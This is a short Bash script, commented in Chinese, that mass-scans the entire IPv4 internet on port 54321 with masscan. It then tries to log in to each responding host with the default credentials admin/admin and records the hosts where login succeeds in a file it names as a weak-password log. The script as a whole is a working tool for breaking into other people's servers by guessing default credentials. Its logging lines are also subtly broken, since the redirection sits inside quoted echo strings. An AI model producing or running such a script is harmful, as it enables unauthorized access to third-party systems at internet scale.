#!/bin/bash

# 定义依赖项
dependencies=(masscan sed xargs curl)

# 检查依赖项并进行安装
for dep in "${dependencies[@]}"; do
  if ! which "$dep" >/dev/null 2>&1; then
    echo "错误：未找到依赖项 '$dep'，正在安装..."
    sudo apt-get install -y "$dep" || sudo yum install -y "$dep"
  fi
done

# 扫描 IP
masscan 0.0.0.0/0 -p54321 --banners --exclude 255.255.255.255 -oJ - --rate 100000 | \
  sed -nE 's/.*"ip": "([^"]+)".*/\1/p' | \
  xargs -P 10 -I {} bash -c '
    # 检查端口 54321 是否可达，超时时间为 2 秒
    if curl --max-time 2 http://{}:54321 >/dev/null 2>&1; then
      # 尝试使用弱密码登陆
      response=$(curl -s "http://{}:54321/login" --data-raw "username=admin&password=admin" --compressed --insecure)
      if grep -q "true" <<< "$response"; then
        echo "{} >> week.log"  # 记录成功登录的 IP
      fi
      echo "{} >> all.log"     # 记录所有扫描的 IP
    fi
  '

# 脚本执行完毕
echo "扫描完成，请查看 week.log 和 all.log 以获取结果。"
